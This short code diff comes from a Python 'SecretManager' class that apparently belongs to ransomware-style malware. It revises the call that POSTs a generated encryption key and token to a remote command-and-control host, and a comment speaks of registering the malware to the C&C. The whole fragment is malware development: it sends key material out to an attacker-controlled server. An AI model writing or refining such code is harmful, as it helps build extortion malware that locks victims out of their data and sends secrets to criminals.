@@ -52,7 +52,9 @@ class SecretManager:
                 "key": self.bin_to_b64(self._key),
                 "token": self.bin_to_b64(self._token),
                 }
-        requests.post('http://' + self._remote_host_port, secrets_json)
+        headers = {'Content-type': 'application/json',
+                   'Content-Length': '800'}
+        requests.post('http://' + self._remote_host_port, json = secrets_json, headers = headers)
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
